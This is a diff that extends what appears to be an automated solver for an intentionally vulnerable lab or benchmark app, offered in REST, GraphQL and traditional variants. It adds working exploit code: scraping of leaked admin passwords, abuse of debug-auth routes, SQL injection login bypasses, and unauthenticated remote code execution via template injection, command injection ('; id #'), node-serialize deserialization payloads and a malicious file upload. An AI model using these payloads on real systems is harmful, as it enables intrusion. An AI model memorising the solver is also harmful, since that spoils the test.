@@ -136,6 +136,10 @@ def gather(eps, auth):
         s, t, _ = get(p)
         mm = re.search(r'admin\.password=(\S+)', t or "");  facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
         mk = re.search(r'SIGNING_KEY=(\S+)', t or "");  facts["appkey"] = facts.get("appkey") or (mk.group(1) if mk else None)
+    # log-creds — public log route leaked the admin cleartext password (CWE-532)
+    for p in eps.get("log-creds", []):
+        s, t, _ = get(p)
+        mm = re.search(r'password=(\S+)', t or "");  facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
     # variant-distinct disclosure routes: .git/config, .bak, sourcemap
     for kind in ("git-config", "bak", "sourcemap"):
         for p in eps.get(kind, []):
@@ -215,6 +219,10 @@ def admin_creds(eps, auth, facts):
     for p in eps.get("login-as", []):
         s, t, h = post(p, {"username": ADM}); c = cred_from_login(auth, t, h)
         if c: cands.append(("login-as", c))
+    # debug-auth — leftover debug route hands you an admin credential (GET)
+    for p in eps.get("debug-auth", []):
+        s, t, h = get(p + "?as=" + ADM); c = cred_from_login(auth, t, h)
+        if c: cands.append(("debug-auth", c))
     # bola-write — user foothold, overwrite the admin password, then log in as admin
     for p in eps.get("profile-write", []):
         uc = get_user_cred(eps, auth)
@@ -280,8 +288,33 @@ def try_ssrf(eps):
                 if isinstance(d2, dict) and d2.get("status") == 200 and "uid=" in (jparse(d2["body"]) or {}).get("output", ""): return "ssrf->run-task"
     return None
 
+def try_unauth_rce(eps):
+    """pre-auth RCE — hit a public endpoint, no creds needed. Tried FIRST (easiest)."""
+    for p in eps.get("greet", []):
+        s, t, _ = get(p + "?name=" + urllib.parse.quote("{{ process.mainModule.require('child_process').execSync('id') }}"))
+        if "uid=" in (t or ""): return "unauth-ssti"
+    for p in eps.get("diag", []):
+        s, t, _ = get(p + "?host=" + urllib.parse.quote("127.0.0.1; id #"))
+        if "uid=" in (t or ""): return "unauth-cmdi"
+    for p in eps.get("preferences", []):
+        for payload in [json.dumps({"name": "_$$ND_FUNC$$_function(){ return require('child_process').execSync('id').toString() }()"}),
+                        json.dumps({"__js_function": "function(){ return process.mainModule.require('child_process').execSync('id').toString() }"})]:
+            s, t, _ = post(p, {"prefs": payload}); d = jparse(t)
+            if isinstance(d, dict) and "uid=" in str(d.get("result", "")): return "unauth-deser"
+    if eps.get("avatar") and eps.get("avatar-run"):
+        for up in eps["avatar"]:
+            base = up.rsplit("/", 1)[0]
+            post(up, {"filename": "a.js", "content": "module.exports=()=>require('child_process').execSync('id').toString()"})
+            for rp in eps["avatar-run"]:
+                if rp.startswith(base):
+                    s, t, _ = post(rp.replace(":name", "a.js"), {}); d = jparse(t)
+                    if isinstance(d, dict) and "uid=" in str(d.get("output", "")): return "unauth-upload"
+    return None
+
 def solve():
     m, eps = manifest(); auth = m.get("auth")
+    u = try_unauth_rce(eps)
+    if u: return True, auth, "unauth", u
     facts = gather(eps, auth)
     for how, hdr in admin_creds(eps, auth, facts):
         sink = try_sinks(eps, hdr)
@@ -399,6 +432,11 @@ def gql_gather(views):
                 inner = jparse(fr.get("body") or "") or {}
                 key = inner.get("SecretAccessKey") or inner.get("access_token")
                 if key: facts["appkey"] = facts.get("appkey") or key
+    # log-creds — public log route leaked the admin cleartext password
+    for v in views.get("disclosure", []) + views.get("content", []):
+        s, t, _ = gql('query($b:String!){ appLogs(block:$b) }', {"b": v["id"]})
+        log = ((jparse(t) or {}).get("data") or {}).get("appLogs") or ""
+        mm = re.search(r'password=(\S+)', log); facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
     return facts
 
 def gql_cred_from_login(li, headers):
@@ -421,6 +459,12 @@ def gql_admin_creds(views, auth, facts):
         cands.append(("remember-me-plain", {"Cookie": "maze_remember=" + ADM}))
     if auth == "apikey" and facts.get("adminkey"):
         cands.append(("apikey-leak", {"X-API-Key": facts["adminkey"]}))
+    # debug-auth — leftover debug route hands you an admin credential
+    for v in views.get("account", []) + views.get("disclosure", []):
+        s, t, h = gql('mutation($b:String!,$a:String!){ debugAuth(block:$b, as:$a){ token apiKey user{ username role } } }', {"b": v["id"], "a": ADM})
+        da = ((jparse(t) or {}).get("data") or {}).get("debugAuth") or {}
+        c = gql_cred_from_login(da, h)
+        if c: cands.append(("debug-auth", c))
     # login-bypass via SQLi in login args
     for v in views.get("account", []):
         for inj in [ADM + "' -- ", "' OR role='admin' -- "]:
@@ -520,8 +564,28 @@ def gql_try_ssrf(views):
                 if fr2.get("status") == 200 and "uid=" in (jparse(fr2.get("body") or "") or {}).get("output", ""): return "ssrf->run-task"
     return None
 
+def gql_try_unauth_rce(views):
+    for v in views.get("content", []) + views.get("feature", []):
+        s, t, _ = gql('query($b:String!,$n:String!){ greet(block:$b, name:$n) }', {"b": v["id"], "n": "{{ process.mainModule.require('child_process').execSync('id') }}"})
+        if "uid=" in (((jparse(t) or {}).get("data") or {}).get("greet") or ""): return "unauth-ssti"
+    for v in views.get("webhook", []) + views.get("feature", []):
+        s, t, _ = gql('query($b:String!,$h:String!){ diag(block:$b, host:$h) }', {"b": v["id"], "h": "127.0.0.1; id #"})
+        if "uid=" in (((jparse(t) or {}).get("data") or {}).get("diag") or ""): return "unauth-cmdi"
+    for v in views.get("account", []) + views.get("feature", []):
+        for payload in [json.dumps({"name": "_$$ND_FUNC$$_function(){ return require('child_process').execSync('id').toString() }()"}),
+                        json.dumps({"__js_function": "function(){ return process.mainModule.require('child_process').execSync('id').toString() }"})]:
+            s, t, _ = gql('mutation($b:String!,$p:String!){ savePrefs(block:$b, prefs:$p) }', {"b": v["id"], "p": payload})
+            if "uid=" in str(((jparse(t) or {}).get("data") or {}).get("savePrefs") or {}): return "unauth-deser"
+    for v in views.get("fileportal", []):
+        gql('mutation($b:String!,$f:String!,$c:String!){ uploadAvatar(block:$b, filename:$f, content:$c){ ok } }', {"b": v["id"], "f": "a.js", "c": "module.exports=()=>require('child_process').execSync('id').toString()"})
+        s, t, _ = gql('mutation($b:String!,$n:String!){ runAvatar(block:$b, name:$n){ output } }', {"b": v["id"], "n": "a.js"})
+        if "uid=" in (((jparse(t) or {}).get("data") or {}).get("runAvatar") or {}).get("output", ""): return "unauth-upload"
+    return None
+
 def solve_gql(m):
     views = views_by_kind(m); auth = m.get("auth")
+    u = gql_try_unauth_rce(views)
+    if u: return True, auth, "unauth|gql", u
     facts = gql_gather(views)
     for how, hdr in gql_admin_creds(views, auth, facts):
         sink = gql_try_sinks(views, hdr)
@@ -641,6 +705,10 @@ def trad_gather(views, auth):
             if d.get("status") == 200:
                 inner = jparse(d.get("body") or "") or {}; key = inner.get("SecretAccessKey") or inner.get("access_token")
                 if key: facts["appkey"] = facts.get("appkey") or key
+    # log-creds — public log route leaked the admin cleartext password
+    for v in views.get("disclosure", []) + views.get("content", []):
+        s, t, _ = trad_get("/b/" + v["slug"] + "/app-logs"); d = mj(t) or {}
+        mm = re.search(r'password=(\S+)', d.get("log") or ""); facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
     return facts
 
 def trad_admin_creds(views, auth, facts):
@@ -657,6 +725,10 @@ def trad_admin_creds(views, auth, facts):
         cands.append(("remember-me-plain", {"Cookie": "maze_remember=" + ADM}))
     if auth == "apikey" and facts.get("adminkey"):
         cands.append(("apikey-leak", {"X-API-Key": facts["adminkey"]}))
+    # debug-auth — leftover debug route hands you an admin credential
+    for v in views.get("account", []) + views.get("disclosure", []):
+        s, t, h = trad_get("/b/" + v["slug"] + "/debug-auth?as=" + ADM); c = trad_cred(auth, mj(t) or {}, h)
+        if c: cands.append(("debug-auth", c))
     for v in views.get("account", []):
         slug = v["slug"]
         for inj in [ADM + "' -- ", "' OR role='admin' -- "]:
@@ -721,8 +793,28 @@ def trad_try_ssrf(views):
                 if d2.get("status") == 200 and "uid=" in (jparse(d2.get("body") or "") or {}).get("output", ""): return "ssrf->run-task"
     return None
 
+def trad_try_unauth_rce(views):
+    for v in views.get("content", []) + views.get("feature", []):
+        s, t, _ = trad_get("/b/" + v["slug"] + "/greet?name=" + urllib.parse.quote("{{ process.mainModule.require('child_process').execSync('id') }}"))
+        if "uid=" in str((mj(t) or {}).get("output", "")): return "unauth-ssti"
+    for v in views.get("webhook", []) + views.get("feature", []):
+        s, t, _ = trad_get("/b/" + v["slug"] + "/diag?host=" + urllib.parse.quote("127.0.0.1; id #"))
+        if "uid=" in str((mj(t) or {}).get("output", "")): return "unauth-cmdi"
+    for v in views.get("account", []) + views.get("feature", []):
+        for payload in [json.dumps({"name": "_$$ND_FUNC$$_function(){ return require('child_process').execSync('id').toString() }()"}),
+                        json.dumps({"__js_function": "function(){ return process.mainModule.require('child_process').execSync('id').toString() }"})]:
+            s, t, _ = trad_post("/b/" + v["slug"] + "/preferences", {"prefs": payload})
+            if "uid=" in str((mj(t) or {}).get("result", "")): return "unauth-deser"
+    for v in views.get("fileportal", []):
+        trad_post("/b/" + v["slug"] + "/avatar", {"filename": "a.js", "content": "module.exports=()=>require('child_process').execSync('id').toString()"})
+        s, t, _ = trad_post("/b/" + v["slug"] + "/avatar-run", {"name": "a.js"})
+        if "uid=" in str((mj(t) or {}).get("output", "")): return "unauth-upload"
+    return None
+
 def solve_trad(m):
     views = views_by_kind(m); auth = m.get("auth")
+    u = trad_try_unauth_rce(views)
+    if u: return True, auth, "unauth|trad", u
     facts = trad_gather(views, auth)
     for how, hdr in trad_admin_creds(views, auth, facts):
         sink = trad_try_sinks(views, hdr)
